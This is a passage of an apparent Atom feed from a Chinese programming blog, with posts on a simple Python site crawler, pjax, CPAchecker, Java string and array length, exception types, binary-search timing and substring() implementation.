class="line">print(html)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="通过队列获取网站所有url的爬虫">通过队列获取网站所有URL的爬虫</h2><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">#python系统关于队列的包</span></span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="comment">#获取URL的包</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment">#获取字符集编码方式</span></span><br><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"><span class="comment">#正则表达式</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">initial_page = <span class="string">"http://www.meng.uno"</span></span><br><span class="line"></span><br><span class="line">url_queue = queue.Queue()</span><br><span class="line">seen = set()</span><br><span class="line"></span><br><span class="line">seen.add(initial_page)</span><br><span class="line">url_queue.put(initial_page)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_urls</span><span class="params">(url)</span>:</span></span><br><span class="line">    req = urllib.request.Request(url)</span><br><span class="line">    <span class="comment">#得到Response</span></span><br><span class="line">    response = urllib.request.urlopen(req)</span><br><span class="line">    <span class="comment">#读出response == 请求文件的全部字符</span></span><br><span class="line">    html = response.read()</span><br><span class="line">    <span class="comment">#获取这个response的编码方式</span></span><br><span class="line">    charset = chardet.detect(html)</span><br><span class="line">    <span class="comment">#以这种编码方式解码打印</span></span><br><span class="line">    html = html.decode(charset.get(<span class="string">"encoding"</span>))</span><br><span class="line">    urls = re.findall(<span class="string">'href=\"https*://w*\.*meng\.uno/.*?\"'</span>, html,re.S)</span><br><span class="line">    uris = re.findall(<span class="string">'href=\"/[^/].*?[^\.]\"'</span>,html, re.S)</span><br><span class="line">    tempseen = set()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> urls:</span><br><span class="line">        tempseen.add(item[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> uris:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">".html"</span> <span class="keyword">in</span> item:</span><br><span class="line">            tempseen.add(<span class="string">"http://www.meng.uno"</span>+item[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'.'</span> <span class="keyword">in</span> item:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tempseen.add(<span class="string">"http://www.meng.uno"</span>+item[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> tempseen</span><br><span class="line">            </span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>): <span class="comment">#一直进行直到海枯石烂</span></span><br><span class="line">    <span class="keyword">if</span> url_queue.qsize()&gt;<span class="number">0</span>:</span><br><span class="line">        current_url = url_queue.get()    <span class="comment">#拿出队例中第一个的url</span></span><br><span class="line">        print(current_url)               <span class="comment">#把这个url代表的网页存储好</span></span><br><span class="line">        <span class="keyword">for</span> next_url <span class="keyword">in</span> extract_urls(current_url): <span class="comment">#提取把这个url里链向的url</span></span><br><span class="line">            <span class="keyword">if</span> next_url <span class="keyword">not</span> <span class="keyword">in</span> seen:      </span><br><span class="line">                seen.add(next_url)</span><br><span class="line">                url_queue.put(next_url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre>      </td>    </tr>  </table></figure><p><strong><em>这里先简单解释，以后有实际项目会再补充！</em></strong></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/51d32f19/">http://home.meng.uno/articles/51d32f19/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      我们先从分析原理入手，然后再使用Python提供的基本的库urllib。

注意，我全程使用的是Python3，如果你必须使用不同版本，请自行百度某些库及函数的转换，需要使用的库不一定你的电脑上预装了，所以请自行百度安装。

原理
网络爬虫，也叫网络蜘蛛(Web Spider)，如果把互联网比喻成一个蜘蛛网，Spider就是一只在网上爬来爬去的蜘蛛。网络爬虫就是根据网页的地址来寻找网页的，也就是URL。

URL
URL就是统一资源定位符(Uniform Resource Locator)，它的一般格式如下(带方括号[]的为可选项)：

protocol ://hostname[:port]/
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Python3" scheme="http://home.meng.uno/tags/Python3/"/>
    
      <category term="爬虫" scheme="http://home.meng.uno/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>pjax: 当ajax遇上pushState</title>
    <link href="http://home.meng.uno/articles/c039b062/"/>
    <id>http://home.meng.uno/articles/c039b062/</id>
    <published>2018-02-12T00:55:00.000Z</published>
    <updated>2020-12-02T01:43:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>var pjax = pushState + ajax;</p></blockquote><h1>一、简介</h1><p>pushState是html5中提供的方法，用以</p><ul>  <li>无刷新的更新浏览器地址栏；</li>  <li>如其名称，将新地址push到历史堆栈中</li></ul><p>用法：<code>pushState(data, title ,url)</code></p><p>data为保存的对象，可以在window.onpopstate时获取到；title为页面标题；url为需地址栏和历史发生改变的url。<br> 正是这点看似很平常的功能，跟ajax结合到一起产生了火花。因为，ajax最擅长的事情就是局部刷新页面。</p><h1>二、ajax的纠结历史</h1><p>一切可以从ajax最擅长的事情说起。</p><p>ajax作为一个异步请求模型，从最初设计开始，也许压根就没打算将它跟浏览器历史挂钩。原因是历史堆栈所记录的，某种意思上可以说是顺序，跟我们理解的“同步”更为密切。</p><p>因而，<code>ajax可以无刷新改变页面内容，却无法改变页面的url</code>。</p><h2 id="历史问题1-如何操控历史">历史问题1 - 如何操控历史</h2><p>当单页面越来越流行，操作记录却很容易被忽略。假设有这样的单页面，按照分类点击，界面逐层递进：<code>体育 - 篮球 -nba -马刺队 - 邓肯</code><br> 当我们点了4下到“邓肯”界面时，一个不小心的刷新，出现在你面前的也许是“体育”。原因是操作记录没有被记录。  <br> 而通常的解决方案是修改hash，每递进一层，去更新url的hash值，这样的方法：</p><ol>  <li>刷新时预先判断url的hash，从而知道这是哪一层，加载相应数据；</li>  <li>支持了历史</li></ol><p>这样的方式貌似比较完善，其实不然。</p><h2 id="历史问题2-对搜索引擎不友好">历史问题2 - 对搜索引擎不友好</h2><p>最大的问题是，hash后生成的内容是不会被搜索引擎引用到。数据不能被爬取，无疑是浪费和损失。因此google放言，咱可以约定个协议：<code>#!xxx</code>这样hash的url，google也去爬取。称之为<code>hash bang</code>（哈希大爆炸？）。这一协议，在g+，twitter，人人，新浪微博上都可以看到。</p><p>事实上，ajax最或缺的两个问题，恰好被pushState的功能补充完善。</p><h1>三、pjax带来的价值</h1><p>除去补齐了ajax的问题，我们发现pjax会给web带来更多的好处。<br> 回到开始说的“两包方便面”，我的意思是，有时你访问两个url，部分数据是相同的。比如百度贴吧，第一页和第二页的区别只是帖子内容（卡片）的不同，网站外框部分（方便面）都是一样的，这些东西就不需要在页面刷新时重复加载。</p><p>ajax处理这样的局部刷新，已经给我们带来了web2.0的体验，而加上pushstate的ajax则更进一步：</p><ol>  <li>一个url对应一套数据，有利于SEO；</li>  <li>更改数据和url时，只是局部刷新，带来较好的用户体验；</li>  <li>兼容性好，对不支持pushstate的浏览器，url也能正常请求页面（虽然有重复加载）；</li>  <li>刷新页面时，由于是url唯一，能正常加载到用户希望看到的数据，比处理hash的方式更方便；</li>  <li>后退与前进的浏览器操作，依然可以局部刷新（通过onpushstate事件捕获）</li></ol><h1>四、注意事项</h1><p>然而pjax不等于单纯的分离使用pushstate与ajax，还必须得做一些封装。缘于以下我能想到的注意事项：</p><ul>  <li>服务器端增加额外处理逻辑<br> 服务器端，需要根据请求的参数，作出全页渲染或局部渲染响应  </li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Accept:text/html, */*; q=0.01</span><br><span class="line">Accept-Encoding:gzip,deflate,sdch</span><br><span class="line">Connection:keep-alive</span><br><span class="line">Host:qianduannotes.duapp.com</span><br><span class="line">User-Agent:AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line">X-PJAX:true</span><br></pre>      </td>    </tr>  </table></figure><p>比如请求头部可以设定一个X-PAJX:true，用以通知服务器。</p><ul>  <li>浏览器兼容</li></ul><p>假如浏览器不支持pushstate，提供fallback操作，直接打开需更改url的地址：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$.support.pjax = window.history &amp;&amp; window.history.pushState</span><br><span class="line">// Fallback</span><br><span class="line">if ( !$.support.pjax ) &#123;</span><br><span class="line">  $.pjax = function( options ) &#123;</span><br><span class="line">    window.location = $.isFunction(options.url) ? options.url() : options.url</span><br><span class="line">  &#125;</span><br><span class="line">  $.fn.pjax = function() &#123; return this &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>本地存储机制</li></ul><p>无疑pjax与localstorage共同使用可以进一步提升体验，但这一步容易忽略的是数据上报。</p><h1>五、参考资料</h1><p><a href="https://github.com/defunkt/jquery-pjax" target="_blank" rel="noopener">jquery-pjax</a><br>  <a href="https://github.com/welefen/pjax" target="_blank" rel="noopener">welefen封装的pjax</a></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/c039b062/">http://home.meng.uno/articles/c039b062/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      var pjax = pushState + ajax;

一、简介
pushState是html5中提供的方法，用以

 * 无刷新的更新浏览器地址栏；
 * 如其名称，将新地址push到历史堆栈中

用法：pushState(data, title ,url)

data为保存的对象，可以在window.onpopstate时获取到；title为页面标题；url为需地址栏和历史发生改变的url。
正是这点看似很平常的功能，跟ajax结合到一起产生了火花。因为，ajax最擅长的事情就是局部刷新页面。

二、ajax的纠结历史
一切可以从ajax最擅长的事情说起。

ajax作为一个异步请求模
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="ajax" scheme="http://home.meng.uno/tags/ajax/"/>
    
      <category term="js" scheme="http://home.meng.uno/tags/js/"/>
    
      <category term="html5" scheme="http://home.meng.uno/tags/html5/"/>
    
      <category term="pjax" scheme="http://home.meng.uno/tags/pjax/"/>
    
      <category term="pushState" scheme="http://home.meng.uno/tags/pushState/"/>
    
  </entry>
  
  <entry>
    <title>CPAchecker</title>
    <link href="http://home.meng.uno/articles/c5d9877c/"/>
    <id>http://home.meng.uno/articles/c5d9877c/</id>
    <published>2018-02-11T14:08:59.000Z</published>
    <updated>2020-12-02T01:42:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>CPAchecker is a tool for configurable software verification which means expressing different program analysis and model checking approaches in one single formalism. The main algorithm is configurable to perform a reachability analysis on arbitrary combinations  of existing configurable program analysis (CPA). One application of CPAchecker is the verification of Linux device drivers.</p><p>CPA provides a conceptual basis for expressing different verification approaches in the same formal setting. The CPA formalism provides an interface for the definition of program analyses, which includes the abstract domain, the post operator, the merge  operator, and the stop operator. Consequently, the corresponding tool implementation CPAchecker provides an implementation framework that allows the seamless integration of program analyses that are expressed in the CPA framework. The comparison of  different approaches in the same experimental setting becomes easy and the experimental results will be more meaningful.</p><h2 id="architecture">Architecture</h2><p><img src="http://www.meng.uno/images/cpa/1.png" alt="CPAchecker"></p><p>The above picture is the overview of CPAchecker’s architecture. The central data structure is a set of control-flow automata (CFA), which consist of control-flow locations and control-flow edges. A location represents a program-counter value, and an edge  represents a program operation, which is either an assume operation, an assignment block, a function call, or a function return. Before a program analysis starts, the input program is transformed into a syntax tree, and further into CFAs. The framework  provides interfaces to SMT solvers and interpolation procedures, such that the CPA operators can be written in a concise and convenient way. From the picture, we know that they use MathSAT as an SMT solver, and CSIsat and MathSAT as interpolation procedures.  They also use JavaBDD as a BDD package, and provide an interface to an Octagon Library as well. The CPA Algorithm is the center of this project and the detailed design is shown as follows.</p><p><img src="http://www.meng.uno/images/cpa/2.png" alt="CPAchecker"></p><p>The CPA algorithm (shown at the top in the above figure) takes as input a set of control-flow automata (CFA) representing the program, and a CPA, which is in most cases a Composite CPA. The interfaces correspond one-to-one to the formal framework. The  elements in the gray box (top right) represent the abstract interfaces of the CPA and the CPA operations. The two gray boxes at the bottom of the figure show two implementations of the interface CPA, one is a Composite CPA that can combine several other  CPAs, and the other is a Leaf CPA.</p><h2 id="build-and-test">Build and Test</h2><p>Owing to the long development history, this project is very prefect which means you could use its binary directly, build from the source and even use their jar-ball in Java applications. To experience it, I will build it from the source and use it in  the command-line.</p><p>We need to install “jdk”, “ant”, “svn” and “subversion” before we build it. Then enter the root directory and run “ant”. Wait a moment and this is the result.</p><p>To test this project, we need to write a C/C++ code without “#include  <headers>”. I choose a simple one (QuickSort) shown in the attachment.</headers></p><p>The result contains a log file, a statistics file and a report which is in “html” format.</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/c5d9877c/">http://home.meng.uno/articles/c5d9877c/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      CPAchecker is a tool for configurable software verification which means expressing different program analysis and model checking approaches in one single formalism. The main algorithm is configurable to perform a reachability analysis on arbitrary combinations of existing configurable program analys
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="CPA" scheme="http://home.meng.uno/tags/CPA/"/>
    
      <category term="CPAchecker" scheme="http://home.meng.uno/tags/CPAchecker/"/>
    
  </entry>
  
  <entry>
    <title>.length与length()的区别</title>
    <link href="http://home.meng.uno/articles/61c2f1f1/"/>
    <id>http://home.meng.uno/articles/61c2f1f1/</id>
    <published>2018-02-10T13:58:04.000Z</published>
    <updated>2020-12-02T01:39:32.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>当我们需要使用数组或者字符串长度时，习惯了使用IDE自动补全的我们是否知道<code>.length</code>与<code>length()</code>的区别喻原因呢？</p></blockquote><p>上面问题的答案是：</p><ul>  <li>数组使用<code>.length</code>属性</li>  <li>字符串使用<code>length()</code>方法</li></ul><p>下面我来回答原因。</p><h2 id="为什么数组有-length属性？">为什么数组有<code>.length</code>属性？</h2><p>在Java中，数组是容器对象，其中包含了固定数量的同一类型的值，一旦数组创建，其长度就是固定的了，于是，其长度可以作为一个属性。</p><h2 id="为什么字符串需要length-方法？">为什么字符串需要<code>length()</code>方法？</h2><p>Java中的String，实际上是一个char类型数组，而char[]已经有了<code>.length</code>属性，所以在实现String时就没必要再定义重复的属性了，于是需要定义一个方法来返回其长度。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/61c2f1f1/">http://home.meng.uno/articles/61c2f1f1/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      当我们需要使用数组或者字符串长度时，习惯了使用IDE自动补全的我们是否知道.length与length()的区别喻原因呢？

上面问题的答案是：

 * 数组使用.length属性
 * 字符串使用length()方法

下面我来回答原因。

为什么数组有.length属性？
在Java中，数组是容器对象，其中包含了固定数量的同一类型的值，一旦数组创建，其长度就是固定的了，于是，其长度可以作为一个属性。

为什么字符串需要length()方法？
Java中的String，实际上是一个char类型数组，而char[]已经有了.length属性，所以在实现String时就没必要再定义重复的属性了，
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="Length" scheme="http://home.meng.uno/tags/Length/"/>
    
  </entry>
  
  <entry>
    <title>Java异常结构层次图</title>
    <link href="http://home.meng.uno/articles/1164dab2/"/>
    <id>http://home.meng.uno/articles/1164dab2/</id>
    <published>2018-02-09T14:11:15.000Z</published>
    <updated>2020-12-02T01:49:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>在Java中，异常分为<code>checked</code>与<code>unchecked</code>，他们都在一个分类层次中，如下图。</p><p><img src="http://www.meng.uno/images/ehd.jpeg" alt="DEH"></p><p>其中，红色的异常是<code>checked</code>异常，意味着在一个方法中，他们<code>throw</code>后必须<code>catch</code>或者<code>declare</code>。</p><p>另一种颜色的为<code>unchecked</code>异常，他们的异常不需要被<code>recover</code>。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/1164dab2/">http://home.meng.uno/articles/1164dab2/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      在Java中，异常分为checked与unchecked，他们都在一个分类层次中，如下图。



其中，红色的异常是checked异常，意味着在一个方法中，他们throw后必须catch或者declare。

另一种颜色的为unchecked异常，他们的异常不需要被recover。



本文链接： http://home.meng.uno/articles/1164dab2/ 欢迎转载！
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="Exception" scheme="http://home.meng.uno/tags/Exception/"/>
    
  </entry>
  
  <entry>
    <title>二分查找的效率</title>
    <link href="http://home.meng.uno/articles/fff444e8/"/>
    <id>http://home.meng.uno/articles/fff444e8/</id>
    <published>2018-02-08T09:20:00.000Z</published>
    <updated>2020-12-02T01:41:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>查找是比较常见的工作，今天我通过对比几种在数组中查找一个确定的值的例子来向大家展示二分查找的魅力。</p></blockquote><h2 id="数组查找元素的几种方法">数组查找元素的几种方法</h2><h3 id="使用list">使用List</h3><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">useList</span><span class="params">(String[] arr, String targetValue)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> Arrays.asList(arr).contains(targetValue);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="使用set">使用Set</h3><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">useSet</span><span class="params">(String[] arr, String targetValue)</span> </span>&#123;</span><br><span class="line">Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;String&gt;(Arrays.asList(arr));</span><br><span class="line"><span class="keyword">return</span> set.contains(targetValue);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="使用for-loop">使用for-loop</h3><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">useLoop</span><span class="params">(String[] arr, String targetValue)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(String s: arr)&#123;</span><br><span class="line"><span class="keyword">if</span>(s.equals(targetValue))</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="使用二分">使用二分</h3><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">useArraysBinarySearch</span><span class="params">(String[] arr, String targetValue)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a =  Arrays.binarySearch(arr, targetValue);</span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="时间复杂性">时间复杂性</h2><h3 id="代码">代码</h3><blockquote>  <p>使用如下代码来验证不同数据规模（5，1k，10k）的查找任务下四种方法的时间复杂性。（二分查找需要对数据排序，排序时间未计算在内。）</p></blockquote><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">String[] arr = <span class="keyword">new</span> String[] &#123;  <span class="string">"CD"</span>,  <span class="string">"BC"</span>, <span class="string">"EF"</span>, <span class="string">"DE"</span>, <span class="string">"AB"</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//use list</span></span><br><span class="line"><span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">useList(arr, <span class="string">"A"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line"><span class="keyword">long</span> duration = endTime - startTime;</span><br><span class="line">System.out.println(<span class="string">"useList:  "</span> + duration / <span class="number">1000000</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//use set</span></span><br><span class="line">startTime = System.nanoTime();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">useSet(arr, <span class="string">"A"</span>);</span><br><span class="line">&#125;</span><br><span class="line">endTime = System.nanoTime();</span><br><span class="line">duration = endTime - startTime;</span><br><span class="line">System.out.println(<span class="string">"useSet:  "</span> + duration / <span class="number">1000000</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//use loop</span></span><br><span class="line">startTime = System.nanoTime();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">useLoop(arr, <span class="string">"A"</span>);</span><br><span class="line">&#125;</span><br><span class="line">endTime = System.nanoTime();</span><br><span class="line">duration = endTime - startTime;</span><br><span class="line">System.out.println(<span class="string">"useLoop:  "</span> + duration / <span class="number">1000000</span>);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="5-结果">&quot;5&quot;结果</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">useList:  <span class="number">13</span></span><br><span class="line">useSet:  <span class="number">72</span></span><br><span class="line">useLoop:  <span class="number">5</span></span><br></pre>      </td>    </tr>  </table></figure><h3 id="1k-结果">&quot;1k&quot;结果</h3><h4 id="随机生成数据">随机生成数据</h4><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">String[] arr = <span class="keyword">new</span> String[<span class="number">1000</span>];</span><br><span class="line"> </span><br><span class="line">Random s = <span class="keyword">new</span> Random();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt; <span class="number">1000</span>; i++)&#123;</span><br><span class="line">arr[i] = String.valueOf(s.nextInt());</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h4 id="结果">结果</h4><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">useList:  <span class="number">112</span></span><br><span class="line">useSet:  <span class="number">2055</span></span><br><span class="line">useLoop:  <span class="number">99</span></span><br><span class="line">useArrayBinary:  <span class="number">12</span></span><br></pre>      </td>    </tr>  </table></figure><h3 id="10k-结果">&quot;10k&quot;结果</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">useList:  <span class="number">1590</span></span><br><span class="line">useSet:  <span class="number">23819</span></span><br><span class="line">useLoop:  <span class="number">1526</span></span><br><span class="line">useArrayBinary:  <span class="number">12</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="结论">结论</h2><p>通过以上结果，我们可以发现二分搜索确实很高效，而且当数据量变大时，其时间增长幅度还比较小。</p><p>以后，我们就可以使用<code>Arrays.binarySearch()</code>来高效查找某元素了。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/fff444e8/">http://home.meng.uno/articles/fff444e8/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      查找是比较常见的工作，今天我通过对比几种在数组中查找一个确定的值的例子来向大家展示二分查找的魅力。

数组查找元素的几种方法
使用List
1
2
3


public static boolean useList(String[] arr, String targetValue) {
	return Arrays.asList(arr).contains(targetValue);
}


使用Set
1
2
3
4


public static boolean useSet(String[] arr, String targetValue) {
	Set&lt;String&gt; set = ne
    
    </summary>
    
      <category term="Algorithm" scheme="http://home.meng.uno/categories/Algorithm/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="算法复杂性" scheme="http://home.meng.uno/tags/%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E6%80%A7/"/>
    
      <category term="二分查找" scheme="http://home.meng.uno/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java Substring() 的实现</title>
    <link href="http://home.meng.uno/articles/f3057e6c/"/>
    <id>http://home.meng.uno/articles/f3057e6c/</id>
    <published>2018-02-08T07:43:08.000Z</published>
    <updated>2020-12-02T02:06:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>写过Java的人应该都用过<code>substring(int bedinIndex, int endIndex)</code>方法。我发现这个简单的方法在实现上居然经过了一次大的变革。</p><h2 id="substring-的用途">substring()的用途</h2><p>代码:</p><figure class="highlight">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">String origin = "asdfg"; </span><br><span class="line">origin = origin.substring(1,3);</span><br><span class="line">System.out.println(origin);</span><br></pre>      </td>    </tr>  </table></figure><p>输出:</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sd</span><br></pre>      </td>    </tr>  </table></figure><p>我们发现它能将原始字符串中从下标为beginIndex到endIndex-1之间的子串取出。那它是怎么实现的呢？</p><h2 id="substring-的实现">substring()的实现</h2><blockquote>  <p>Java中的字符串有三个域：char value[], int offset以及int count，它们分别存储字符串的值，起始下标与长度。</p></blockquote><h3 id="jdk6版本">JDK6版本</h3><p>在这个版本中，每次执行substring()方法时并不会新建新的string，仅仅只是将上述三个域中的offset，count做必要的修改。返回对象仍指向原来的数据。</p><p><img 